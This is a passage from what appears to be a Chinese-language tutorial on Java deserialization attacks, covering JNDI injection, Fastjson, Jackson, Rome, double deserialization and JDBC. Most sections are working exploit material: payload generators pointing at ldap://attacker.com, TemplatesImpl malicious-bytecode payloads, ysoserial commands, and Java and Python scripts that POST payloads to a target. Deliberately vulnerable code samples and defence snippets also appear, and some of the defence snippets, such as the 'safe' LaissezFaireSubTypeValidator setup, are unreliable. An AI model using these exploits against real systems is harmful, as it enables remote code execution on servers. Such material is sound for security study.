    public static void main(String[] args) throws Exception {
        // 创建JdbcRowSetImpl对象
        JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl();
        
        // 设置dataSourceName为恶意JNDI URL
        jdbcRowSet.setDataSourceName("ldap://attacker.com:1389/EvilClass");
        
        // 序列化
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(jdbcRowSet);
        oos.close();
        
        // 保存Payload
        byte[] payload = baos.toByteArray();
        FileOutputStream fos = new FileOutputStream("jndi_payload.bin");
        fos.write(payload);
        fos.close();
        
        System.out.println("Payload generated: " + payload.length + " bytes");
    }
}
```

#### 使用ysoserial生成

```bash
# 生成JNDI注入Payload
java -jar ysoserial.jar JdbcRowSetImpl "ldap://attacker.com:1389/EvilClass" > jndi_payload.bin

# 或者使用RMI协议
java -jar ysoserial.jar JdbcRowSetImpl "rmi://attacker.com:1099/EvilClass" > jndi_rmi_payload.bin
```

### 4.4 利用代码示例

```java
import javax.naming.*;
import java.io.*;
import java.net.*;
import java.util.*;

public class JNDIExploit {
    public static void main(String[] args) throws Exception {
        String target = args[0]; // 目标URL
        String ldapUrl = args[1]; // LDAP服务器地址
        
        // 构造Payload
        byte[] payload = generatePayload(ldapUrl);
        
        // 发送Payload
        sendPayload(target, payload);
    }
    
    private static byte[] generatePayload(String ldapUrl) throws Exception {
        // 使用ysoserial生成
        ProcessBuilder pb = new ProcessBuilder(
            "java", "-jar", "ysoserial.jar", 
            "JdbcRowSetImpl", ldapUrl
        );
        Process process = pb.start();
        
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        byte[] buffer = new byte[1024];
        int len;
        while ((len = process.getInputStream().read(buffer)) != -1) {
            baos.write(buffer, 0, len);
        }
        process.waitFor();
        return baos.toByteArray();
    }
    
    private static void sendPayload(String target, byte[] payload) throws Exception {
        URL url = new URL(target);
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setRequestMethod("POST");
        conn.setDoOutput(true);
        conn.setRequestProperty("Content-Type", "application/octet-stream");
        
        OutputStream os = conn.getOutputStream();
        os.write(payload);
        os.flush();
        os.close();
        
        int code = conn.getResponseCode();
        System.out.println("Response: " + code);
    }
}
```

### 4.5 防御措施

```java
// 1. 升级JDK版本
// JDK 8u191+, JDK 11.0.1+, JDK 13+ 默认禁止从远程代码库加载类

// 2. 禁用JNDI（如果不需要）
System.setProperty("java.naming.factory.initial", "disabled");

// 3. 设置com.sun.jndi.ldap.object.trustURLCodebase为false
System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "false");
System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "false");

// 4. 白名单限制JNDI URL
public class SafeJNDI {
    private static final Set<String> ALLOWED_PROTOCOLS = new HashSet<>(Arrays.asList("java"));
    
    public Object safeLookup(String jndiUrl) throws NamingException {
        // 验证URL协议
        if (!isAllowed(jndiUrl)) {
            throw new NamingException("JNDI URL not allowed: " + jndiUrl);
        }
        
        Context ctx = new InitialContext();
        return ctx.lookup(jndiUrl);
    }
    
    private boolean isAllowed(String url) {
        for (String protocol : ALLOWED_PROTOCOLS) {
            if (url.startsWith(protocol + ":")) {
                return true;
            }
        }
        return false;
    }
}

// 5. 使用安全管理器
System.setSecurityManager(new SecurityManager() {
    @Override
    public void checkConnect(String host, int port) {
        // 限制网络连接
    }
});

// 6. 输入验证
public String sanitizeJNDIUrl(String url) {
    // 禁止ldap://, rmi://等协议
    if (url.matches("^(ldap|ldaps|rmi|dns|iiop|corba):.*")) {
        throw new IllegalArgumentException("Unsupported JNDI protocol");
    }
    return url;
}
```

---

## 5. Fastjson 反序列化

### 5.1 原理讲解

Fastjson是阿里巴巴开源的一个高性能JSON库，广泛用于Java项目中的JSON序列化和反序列化。Fastjson在反序列化时会自动调用对象的setter方法和某些特定getter方法，这就为攻击者提供了利用机会。

#### 漏洞原理

```
┌─────────────────────────────────────────────────────────────┐
│                    Fastjson反序列化漏洞流程                   │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  1. 攻击者构造恶意JSON                                       │
│       ↓                                                     │
│  2. JSON中包含@type指定类名                                  │
│       ↓                                                     │
│  3. Fastjson根据@type实例化指定类                            │
│       ↓                                                     │
│  4. 调用对象的setter和getter方法                             │
│       ↓                                                     │
│  5. 某些类的getter/setter会触发危险操作                      │
│       ↓                                                     │
│  6. 如JdbcRowSetImpl.setDataSourceName() → JNDI注入        │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

#### 关键特性：@type

```json
{
    "@type": "com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName": "ldap://attacker.com:1389/Evil",
    "autoCommit": true
}
```

Fastjson看到 `@type` 后会：
1. 加载指定的类
2. 实例化对象
3. 调用setter方法设置属性
4. 在某些情况下调用getter方法

### 5.2 漏洞代码示例

```java
import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;

public class VulnerableFastjson {
    public static void main(String[] args) {
        // 危险：直接解析用户输入的JSON
        String userInput = request.getParameter("data");
        
        // 危险！默认会处理@type
        Object obj = JSON.parse(userInput);
        
        // 同样危险
        Object obj2 = JSON.parseObject(userInput);
        
        System.out.println("Parsed: " + obj);
    }
}
```

### 5.3 Payload构造

#### JNDI注入Payload（Fastjson 1.2.24及之前）

```json
{
    "@type": "com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName": "ldap://attacker.com:1389/EvilClass",
    "autoCommit": true
}
```

#### 利用TemplatesImpl（Fastjson 1.2.41-1.2.47）

```java
import com.alibaba.fastjson.JSON;

public class FastjsonPayload {
    public static void main(String[] args) {
        // 构造恶意JSON
        String payload = "{\n"
            + "    \"@type\": \"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",\n"
            + "    \"_bytecodes\": [\"恶意类字节码的base64\"],\n"
            + "    \"_name\": \"evil\",\n"
            + "    \"_tfactory\": {},\n"
            + "    \"_outputProperties\": {}\n"
            + "}";
        
        // 这个Payload会在解析时加载恶意字节码
        System.out.println(payload);
    }
}
```

#### 完整利用代码

```java
import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;
import java.io.*;
import java.util.Base64;

public class FastjsonExploit {
    public static void main(String[] args) throws Exception {
        // 读取恶意类字节码
        byte[] evilCode = readFile("EvilClass.class");
        String base64Code = Base64.getEncoder().encodeToString(evilCode);
        
        // 构造Payload
        String payload = constructPayload(base64Code);
        
        // 保存Payload
        writeFile("fastjson_payload.txt", payload.getBytes());
        
        System.out.println("Payload generated!");
    }
    
    private static String constructPayload(String base64Code) {
        return "{\n"
            + "    \"@type\": \"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",\n"
            + "    \"_bytecodes\": [\"" + base64Code + "\"],\n"
            + "    \"_name\": \"evil\",\n"
            + "    \"_tfactory\": {},\n"
            + "    \"_outputProperties\": {}\n"
            + "}";
    }
    
    private static byte[] readFile(String filename) throws Exception {
        FileInputStream fis = new FileInputStream(filename);
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        byte[] buffer = new byte[1024];
        int len;
        while ((len = fis.read(buffer)) != -1) {
            baos.write(buffer, 0, len);
        }
        fis.close();
        return baos.toByteArray();
    }
    
    private static void writeFile(String filename, byte[] data) throws Exception {
        FileOutputStream fos = new FileOutputStream(filename);
        fos.write(data);
        fos.close();
    }
}
```

#### 使用工具生成Payload

```bash
# 使用fastjson_payload工具
python3 fastjson_payload.py -u http://target.com/api -c "calc"

# 或者手动构造curl请求
curl -X POST http://target.com/api \
  -H "Content-Type: application/json" \
  -d '{
    "@type": "com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName": "ldap://attacker.com:1389/EvilClass",
    "autoCommit": true
  }'
```

### 5.4 利用代码示例

```python
#!/usr/bin/env python3
import requests
import base64
import sys

def generate_payload(gadget, command):
    """生成Fastjson Payload"""
    if gadget == "jndi":
        return {
            "@type": "com.sun.rowset.JdbcRowSetImpl",
            "dataSourceName": f"ldap://attacker.com:1389/{command}",
            "autoCommit": True
        }
    elif gadget == "templates":
        # 需要预先准备恶意类字节码
        with open("EvilClass.class", "rb") as f:
            bytecode = base64.b64encode(f.read()).decode()
        return {
            "@type": "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
            "_bytecodes": [bytecode],
            "_name": "evil",
            "_tfactory": {},
            "_outputProperties": {}
        }
    return {}

def exploit(target, payload):
    """发送攻击请求"""
    headers = {
        "Content-Type": "application/json"
    }
    
    try:
        resp = requests.post(target, json=payload, headers=headers, timeout=10)
        print(f"Status: {resp.status_code}")
        print(f"Response: {resp.text[:500]}")
    except Exception as e:
        print(f"Error: {e}")

def main():
    if len(sys.argv) != 4:
        print(f"Usage: {sys.argv[0]} <target> <gadget> <command>")
        print(f"Gadgets: jndi, templates")
        sys.exit(1)
    
    target = sys.argv[1]
    gadget = sys.argv[2]
    command = sys.argv[3]
    
    payload = generate_payload(gadget, command)
    exploit(target, payload)

if __name__ == "__main__":
    main()
```

### 5.5 防御措施

```java
import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;
import com.alibaba.fastjson.serializer.SerializerFeature;

public class FastjsonDefense {
    public static void main(String[] args) {
        String json = "{\"name\":\"admin\",\"age\":25}";
        
        // 1. 升级到Fastjson 1.2.83+ 或 2.0+
        // 这些版本默认禁用autoType
        
        // 2. 禁用autoType（推荐）
        ParserConfig.getGlobalInstance().setAutoTypeSupport(false);
        
        // 3. 使用白名单（如果必须使用autoType）
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        ParserConfig.getGlobalInstance().addAccept("com.safe.model.User");
        ParserConfig.getGlobalInstance().addAccept("com.safe.model.Order");
        
        // 4. 使用@JSONType注解限制反序列化类
        // @JSONType(typeName = "user")
        // public class User { ... }
        
        // 5. 使用JSON.parseObject并指定Class
        User user = JSON.parseObject(json, User.class);
        
        // 6. 使用Jackson或Gson替代Fastjson
        // Gson示例
        Gson gson = new Gson();
        User user2 = gson.fromJson(json, User.class);
    }
}

// 7. 配置安全策略（fastjson 1.2.68+）
// 在classpath下添加fastjson_autotype_whitelist.txt
// 或在代码中配置：
ParserConfig.getGlobalInstance().addDeny("java.lang.Runtime");
ParserConfig.getGlobalInstance().addDeny("java.lang.ProcessBuilder");
```

---

## 6. Jackson 反序列化

### 6.1 原理讲解

Jackson是另一个流行的Java JSON处理库。与Fastjson类似，Jackson在反序列化时也会调用setter和getter方法。当启用了多态类型处理（如 `@class` 或 `defaultTyping`）时，攻击者可以指定任意类进行实例化。

#### 漏洞原理

```
┌─────────────────────────────────────────────────────────────┐
│                    Jackson反序列化漏洞流程                    │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  1. 攻击者构造恶意JSON                                       │
│       ↓                                                     │
│  2. JSON中包含@class或启用defaultTyping                     │
│       ↓                                                     │
│  3. Jackson根据类型信息实例化指定类                          │
│       ↓                                                     │
│  4. 调用对象的setter和getter方法                             │
│       ↓                                                     │
│  5. 利用特定类的setter/getter触发RCE                        │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

#### 关键配置：defaultTyping

```java
// 危险配置：启用defaultTyping
ObjectMapper mapper = new ObjectMapper();
mapper.enableDefaultTyping(); // 启用多态类型处理
```

启用后，JSON格式变为：
```json
[
    "com.sun.rowset.JdbcRowSetImpl",
    {
        "dataSourceName": "ldap://attacker.com:1389/Evil",
        "autoCommit": true
    }
]
```

### 6.2 漏洞代码示例

```java
import com.fasterxml.jackson.databind.ObjectMapper;

public class VulnerableJackson {
    private static final ObjectMapper mapper = new ObjectMapper();
    
    static {
        // 危险配置！
        mapper.enableDefaultTyping();
    }
    
    public static void main(String[] args) throws Exception {
        // 危险：直接解析用户输入
        String userInput = request.getParameter("data");
        
        // 会触发反序列化漏洞
        Object obj = mapper.readValue(userInput, Object.class);
        
        System.out.println("Parsed: " + obj);
    }
}
```

### 6.3 Payload构造

#### JNDI注入Payload

```json
[
    "com.sun.rowset.JdbcRowSetImpl",
    {
        "dataSourceName": "ldap://attacker.com:1389/EvilClass",
        "autoCommit": true
    }
]
```

#### 利用TemplatesImpl

```json
[
    "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
    {
        "_bytecodes": ["恶意类字节码的base64"],
        "_name": "evil",
        "_tfactory": {},
        "_outputProperties": {}
    }
]
```

#### 完整利用代码

```java
import com.fasterxml.jackson.databind.ObjectMapper;
import java.io.*;
import java.util.Base64;

public class JacksonPayload {
    public static void main(String[] args) throws Exception {
        // 读取恶意类字节码
        byte[] evilCode = readFile("EvilClass.class");
        String base64Code = Base64.getEncoder().encodeToString(evilCode);
        
        // 构造Payload
        String payload = "[\n"
            + "    \"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",\n"
            + "    {\n"
            + "        \"_bytecodes\": [\"" + base64Code + "\"],\n"
            + "        \"_name\": \"evil\",\n"
            + "        \"_tfactory\": {},\n"
            + "        \"_outputProperties\": {}\n"
            + "    }\n"
            + "]";
        
        // 保存Payload
        writeFile("jackson_payload.txt", payload.getBytes());
        
        System.out.println("Payload generated!");
    }
    
    private static byte[] readFile(String filename) throws Exception {
        FileInputStream fis = new FileInputStream(filename);
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        byte[] buffer = new byte[1024];
        int len;
        while ((len = fis.read(buffer)) != -1) {
            baos.write(buffer, 0, len);
        }
        fis.close();
        return baos.toByteArray();
    }
    
    private static void writeFile(String filename, byte[] data) throws Exception {
        FileOutputStream fos = new FileOutputStream(filename);
        fos.write(data);
        fos.close();
    }
}
```

#### Python利用脚本

```python
#!/usr/bin/env python3
import requests
import base64
import sys
import json

def generate_payload(gadget, command):
    """生成Jackson Payload"""
    if gadget == "jndi":
        return [
            "com.sun.rowset.JdbcRowSetImpl",
            {
                "dataSourceName": f"ldap://attacker.com:1389/{command}",
                "autoCommit": True
            }
        ]
    elif gadget == "templates":
        with open("EvilClass.class", "rb") as f:
            bytecode = base64.b64encode(f.read()).decode()
        return [
            "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
            {
                "_bytecodes": [bytecode],
                "_name": "evil",
                "_tfactory": {},
                "_outputProperties": {}
            }
        ]
    return {}

def exploit(target, payload):
    """发送攻击请求"""
    headers = {
        "Content-Type": "application/json"
    }
    
    try:
        resp = requests.post(target, json=payload, headers=headers, timeout=10)
        print(f"Status: {resp.status_code}")
        print(f"Response: {resp.text[:500]}")
    except Exception as e:
        print(f"Error: {e}")

def main():
    if len(sys.argv) != 4:
        print(f"Usage: {sys.argv[0]} <target> <gadget> <command>")
        sys.exit(1)
    
    target = sys.argv[1]
    gadget = sys.argv[2]
    command = sys.argv[3]
    
    payload = generate_payload(gadget, command)
    exploit(target, payload)

if __name__ == "__main__":
    main()
```

### 6.4 防御措施

```java
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.jsontype.impl.LaissezFaireSubTypeValidator;

public class JacksonDefense {
    public static void main(String[] args) {
        // 1. 禁用defaultTyping
        ObjectMapper mapper = new ObjectMapper();
        // 不要调用 mapper.enableDefaultTyping();
        
        // 2. 使用安全的类型验证器
        ObjectMapper safeMapper = new ObjectMapper();
        safeMapper.activateDefaultTyping(
            LaissezFaireSubTypeValidator.instance,
            ObjectMapper.DefaultTyping.NON_FINAL
        );
        
        // 3. 注册自定义反序列化器
        SimpleModule module = new SimpleModule();
        module.addDeserializer(Object.class, new SafeObjectDeserializer());
        mapper.registerModule(module);
        
        // 4. 配置反序列化特性
        mapper.configure(DeserializationFeature.FAIL_ON_UNKNOWN_PROPERTIES, true);
        
        // 5. 使用@JsonTypeInfo和@JsonSubTypes注解
        // @JsonTypeInfo(use = JsonTypeInfo.Id.NAME, property = "type")
        // @JsonSubTypes({
        //     @JsonSubTypes.Type(value = SafeClass.class, name = "safe")
        // })
        
        // 6. 升级到Jackson 2.10+，使用SafeDefaultTyping
        // ObjectMapper mapper = new ObjectMapper();
        // mapper.activateDefaultTyping(
        //     BasicPolymorphicTypeValidator.builder()
        //         .allowIfBaseType("com.safe.")
        //         .build(),
        //     ObjectMapper.DefaultTyping.NON_FINAL
        // );
    }
}

// 7. 自定义反序列化器
class SafeObjectDeserializer extends JsonDeserializer<Object> {
    @Override
    public Object deserialize(JsonParser p, DeserializationContext ctxt) throws IOException {
        // 自定义反序列化逻辑，限制允许的类
        JsonNode node = p.getCodec().readTree(p);
        // 验证和处理
        return node;
    }
}
```

---

## 7. Rome 反序列化

### 7.1 原理讲解

Rome是一个用于生成RSS和Atom feeds的Java库。Rome反序列化漏洞利用的是 `EqualsBean` 和 `ToStringBean` 类在反序列化时会调用对象的getter方法这一特性。

#### 漏洞原理

```
┌─────────────────────────────────────────────────────────────┐
│                    Rome反序列化漏洞流程                       │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  HashMap.readObject()                                       │
│       ↓                                                     │
│  HashMap.put()                                              │
│       ↓                                                     │
│  HashMap.hash()                                             │
│       ↓                                                     │
│  ObjectBean.hashCode()                                      │
│       ↓                                                     │
│  EqualsBean.beanHashCode()                                  │
│       ↓                                                     │
│  ToStringBean.toString()                                    │
│       ↓                                                     │
│  TemplatesImpl.getOutputProperties()                        │
│       ↓                                                     │
│  加载恶意字节码 → 执行任意代码                                │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

#### 关键类分析

**ObjectBean**：
```java
public class ObjectBean implements Serializable, Cloneable {
    private final Class _beanClass;
    private final Object _obj;
    
    public int hashCode() {
        return EqualsBean.beanHashCode(_obj);
    }
}
```

**EqualsBean**：
```java
public class EqualsBean implements Serializable {
    public static int beanHashCode(Object obj) {
        return obj.toString().hashCode();
    }
}
```

**ToStringBean**：
```java
public class ToStringBean implements Serializable {
    public String toString() {
        // 会调用对象的getter方法
        return toString(_obj);
    }
}
```

### 7.2 漏洞代码示例

```java
import java.io.*;

public class VulnerableRome {
    public static void main(String[] args) throws Exception {
        // 从文件读取序列化数据
        FileInputStream fis = new FileInputStream("payload.bin");
        ObjectInputStream ois = new ObjectInputStream(fis);
        
        // 危险：直接反序列化
        Object obj = ois.readObject();
        System.out.println("Deserialized: " + obj);
        
        ois.close();
    }
}
```

### 7.3 Payload构造

#### 手动构造Payload

```java
import com.sun.syndication.feed.impl.EqualsBean;
import com.sun.syndication.feed.impl.ObjectBean;
import com.sun.syndication.feed.impl.ToStringBean;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;

public class RomePayload {
    public static void main(String[] args) throws Exception {
        // 1. 准备TemplatesImpl（包含恶意字节码）
        TemplatesImpl templates = createTemplatesImpl();
        
        // 2. 创建ToStringBean
        ToStringBean toStringBean = new ToStringBean(TemplatesImpl.class, templates);
        
        // 3. 创建ObjectBean
        ObjectBean objectBean = new ObjectBean(ToStringBean.class, toStringBean);
        
        // 4. 创建HashMap（触发hashCode）
        HashMap map = new HashMap();
        map.put(objectBean, "value");
        
        // 5. 序列化
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(map);
        oos.close();
        
        // 6. 保存Payload
        byte[] payload = baos.toByteArray();
        FileOutputStream fos = new FileOutputStream("rome_payload.bin");
        fos.write(payload);
        fos.close();
        
        System.out.println("Payload generated: " + payload.length + " bytes");
    }
    
    private static TemplatesImpl createTemplatesImpl() throws Exception {
        TemplatesImpl templates = new TemplatesImpl();
        
        // 读取恶意类字节码
        byte[] evilCode = readFile("EvilClass.class");
        
        setField(templates, "_bytecodes", new byte[][]{evilCode});
        setField(templates, "_name", "evil");
        setField(templates, "_tfactory", new com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl());
        
        return templates;
    }
    
    private static void setField(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
    
    private static byte[] readFile(String filename) throws Exception {
        FileInputStream fis = new FileInputStream(filename);
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        byte[] buffer = new byte[1024];
        int len;
        while ((len = fis.read(buffer)) != -1) {
            baos.write(buffer, 0, len);
        }
        fis.close();
        return baos.toByteArray();
    }
}
```

#### 使用ysoserial生成

```bash
# 生成Rome链Payload
java -jar ysoserial.jar Rome "calc" > rome_payload.bin
```

### 7.4 利用代码示例

```java
import java.io.*;
import java.net.*;

public class RomeExploit {
    public static void main(String[] args) throws Exception {
        // 读取Payload
        byte[] payload = readFile("rome_payload.bin");
        
        // 发送Payload
        String target = "http://vulnerable-app.com/api/deserialize";
        sendPayload(target, payload);
    }
    
    private static void sendPayload(String target, byte[] payload) throws Exception {
        URL url = new URL(target);
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setRequestMethod("POST");
        conn.setDoOutput(true);
        conn.setRequestProperty("Content-Type", "application/octet-stream");
        
        OutputStream os = conn.getOutputStream();
        os.write(payload);
        os.flush();
        os.close();
        
        int code = conn.getResponseCode();
        System.out.println("Response: " + code);
    }
    
    private static byte[] readFile(String filename) throws Exception {
        FileInputStream fis = new FileInputStream(filename);
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        byte[] buffer = new byte[1024];
        int len;
        while ((len = fis.read(buffer)) != -1) {
            baos.write(buffer, 0, len);
        }
        fis.close();
        return baos.toByteArray();
    }
}
```

### 7.5 防御措施

```java
// 1. 升级Rome库到安全版本
// Rome 1.15.0+ 修复了此漏洞

// 2. 使用ObjectInputFilter（Java 9+）
ObjectInputFilter filter = ObjectInputFilter.Config.createFilter(
    "!com.sun.syndication.feed.impl.ObjectBean;" +
    "!com.sun.syndication.feed.impl.EqualsBean;" +
    "!com.sun.syndication.feed.impl.ToStringBean"
);

// 3. 自定义ObjectInputStream
public class SafeObjectInputStream extends ObjectInputStream {
    private static final Set<String> DENIED_CLASSES = new HashSet<>(Arrays.asList(
        "com.sun.syndication.feed.impl.ObjectBean",
        "com.sun.syndication.feed.impl.EqualsBean",
        "com.sun.syndication.feed.impl.ToStringBean"
    ));
    
    public SafeObjectInputStream(InputStream in) throws IOException {
        super(in);
    }
    
    @Override
    protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
        if (DENIED_CLASSES.contains(desc.getName())) {
            throw new InvalidClassException("Unauthorized deserialization", desc.getName());
        }
        return super.resolveClass(desc);
    }
}

// 4. 使用JSON替代Java原生序列化
```

---

## 8. 二次反序列化

### 8.1 原理讲解

二次反序列化（Double Deserialization）是指在一个反序列化过程中，触发了另一次反序列化。这种技术常用于绕过某些安全限制，或者利用那些在第一次反序列化时无法直接触发的漏洞。

#### 常见场景

```
┌─────────────────────────────────────────────────────────────┐
│                    二次反序列化场景                           │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  场景1：反序列化触发JNDI lookup                             │
│  ObjectInputStream.readObject()                             │
│       ↓                                                     │
│  JdbcRowSetImpl.readObject()                                │
│       ↓                                                     │
│  setAutoCommit() → connect()                                │
│       ↓                                                     │
│  InitialContext.lookup()                                    │
│       ↓                                                     │
│  从LDAP/RMI获取对象 → 第二次反序列化                        │
│                                                             │
│  场景2：反序列化触发表达式求值                              │
│  ObjectInputStream.readObject()                             │
│       ↓                                                     │
│  某个类的readObject()                                       │
│       ↓                                                     │
│  触发SpEL/Ognl表达式求值                                    │
│       ↓                                                     │
│  表达式中包含反序列化操作                                   │
│                                                             │
│  场景3：反序列化触发XML/JSON解析                            │
│  ObjectInputStream.readObject()                             │
│       ↓                                                     │
│  某个类的readObject()                                       │
│       ↓                                                     │
│  解析XML/JSON字符串                                         │
│       ↓                                                     │
│  XML/JSON中包含恶意对象 → 第二次反序列化                    │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### 8.2 漏洞代码示例

```java
import java.io.*;
import javax.naming.*;

public class VulnerableDoubleDeserialization {
    public static void main(String[] args) throws Exception {
        // 第一次反序列化
        FileInputStream fis = new FileInputStream("payload.bin");
        ObjectInputStream ois = new ObjectInputStream(fis);
        
        // 这个对象在反序列化时会触发JNDI lookup
        Object obj = ois.readObject();
        
        ois.close();
    }
}

// 危险的类：在setter中触发第二次操作
public class DangerousObject implements Serializable {
    private String config;
    
    public void setConfig(String config) {
        this.config = config;
        // 危险：在setter中解析JSON
        Object parsed = JSON.parse(config);
    }
}
```

### 8.3 Payload构造

#### 二次反序列化 + JNDI

```java
import com.sun.rowset.JdbcRowSetImpl;
import java.io.*;

public class DoubleDeserializationPayload {
    public static void main(String[] args) throws Exception {
        // 构造JdbcRowSetImpl，在反序列化时触发JNDI
        JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl();
        jdbcRowSet.setDataSourceName("ldap://attacker.com:1389/EvilClass");
        
        // 序列化
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(jdbcRowSet);
        oos.close();
        
        byte[] payload = baos.toByteArray();
        
        // 保存Payload
        FileOutputStream fos = new FileOutputStream("double_deser_payload.bin");
        fos.write(payload);
        fos.close();
        
        System.out.println("Payload generated: " + payload.length + " bytes");
    }
}
```

#### 二次反序列化 + SpEL

```java
import org.springframework.expression.spel.standard.SpelExpressionParser;
import org.springframework.expression.spel.support.StandardEvaluationContext;
import java.io.*;

public class SpELDoubleDeserialization {
    public static void main(String[] args) throws Exception {
        // 构造包含SpEL表达式的对象
        String spel = "#{T(java.lang.Runtime).getRuntime().exec('calc')}";
        
        // 创建恶意对象
        MaliciousObject obj = new MaliciousObject();
        obj.setExpression(spel);
        
        // 序列化
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(obj);
        oos.close();
        
        byte[] payload = baos.toByteArray();
        FileOutputStream fos = new FileOutputStream("spel_double_deser.bin");
        fos.write(payload);
        fos.close();
    }
}

class MaliciousObject implements Serializable {
    private String expression;
    
    public void setExpression(String expression) {
        this.expression = expression;
        // 反序列化时触发SpEL求值
        SpelExpressionParser parser = new SpelExpressionParser();
        StandardEvaluationContext context = new StandardEvaluationContext();
        parser.parseExpression(expression).getValue(context);
    }
}
```

### 8.4 利用代码示例

```java
import java.io.*;
import java.net.*;

public class DoubleDeserializationExploit {
    public static void main(String[] args) throws Exception {
        // 读取Payload
        byte[] payload = readFile("double_deser_payload.bin");
        
        // 发送Payload
        String target = "http://vulnerable-app.com/api/deserialize";
        sendPayload(target, payload);
    }
    
    private static void sendPayload(String target, byte[] payload) throws Exception {
        URL url = new URL(target);
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setRequestMethod("POST");
        conn.setDoOutput(true);
        conn.setRequestProperty("Content-Type", "application/octet-stream");
        
        OutputStream os = conn.getOutputStream();
        os.write(payload);
        os.flush();
        os.close();
        
        int code = conn.getResponseCode();
        System.out.println("Response: " + code);
    }
    
    private static byte[] readFile(String filename) throws Exception {
        FileInputStream fis = new FileInputStream(filename);
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        byte[] buffer = new byte[1024];
        int len;
        while ((len = fis.read(buffer)) != -1) {
            baos.write(buffer, 0, len);
        }
        fis.close();
        return baos.toByteArray();
    }
}
```

### 8.5 防御措施

```java
// 1. 禁用JNDI（如果不需要）
System.setProperty("java.naming.factory.initial", "disabled");

// 2. 限制表达式求值
// Spring Security：禁用某些SpEL特性
StandardEvaluationContext context = new StandardEvaluationContext();
context.setVariable("T", null); // 禁用类引用

// 3. 使用ObjectInputFilter
ObjectInputFilter filter = ObjectInputFilter.Config.createFilter(
    "maxdepth=3;" +  // 限制反序列化深度
    "!com.sun.rowset.JdbcRowSetImpl;" +
    "!javax.naming.InitialContext"
);

// 4. 自定义ObjectInputStream，限制嵌套反序列化
public class SafeObjectInputStream extends ObjectInputStream {
    private int depth = 0;
    private static final int MAX_DEPTH = 3;
    
    public SafeObjectInputStream(InputStream in) throws IOException {
        super(in);
    }
    
    @Override
    protected Object resolveObject(Object obj) throws IOException {
        depth++;
        if (depth > MAX_DEPTH) {
            throw new InvalidObjectException("Deserialization depth exceeded");
        }
        Object result = super.resolveObject(obj);
        depth--;
        return result;
    }
}

// 5. 输入验证
public String sanitizeInput(String input) {
    // 禁止包含特定模式的输入
    if (input.contains("ldap://") || input.contains("rmi://")) {
        throw new IllegalArgumentException("Invalid input");
    }
    return input;
}
```

---

## 9. JDBC 反序列化

### 9.1 原理讲解

JDBC（Java Database Connectivity）是Java连接数据库的标准API。JDBC反序列化漏洞通常发生在数据库连接配置或结果集处理过程中，攻击者可以通过控制数据库连接URL或返回的数据来触发反序列化。

#### 常见漏洞场景

```
┌─────────────────────────────────────────────────────────────┐
│                    JDBC反序列化漏洞场景                       │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  场景1：H2 Database RCE                                    │
│  jdbc:h2:mem:test;INIT=RUNSCRIPT FROM 'http://evil.com/sql' │
│       ↓                                                     │
│  数据库初始化时执行远程SQL脚本                              │
│       ↓                                                     │
│  SQL脚本中包含CREATE ALIAS → 执行Java代码                  │
│                                                             │
│  场景2：MySQL反序列化                                      │
│  jdbc:mysql://attacker.com:3306/test                       │
│       ↓                                                     │
│  连接恶意MySQL服务器                                        │
│       ↓                                                     │
│  服务器返回序列化数据 → 客户端反序列化                     │
│                                                             │
│  场景3：PostgreSQL反序列化                                 │
│  利用PostgreSQL的pgjdbc驱动特性                            │
│       ↓                                                     │
│  通过socketFactory参数加载恶意类                           │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### 9.2 漏洞代码示例

```java
import java.sql.*;

public class VulnerableJDBC {
    public static void main(String[] args) throws Exception {
        // 危险：直接使用用户输入的数据库URL
        String dbUrl = request.getParameter("dbUrl");
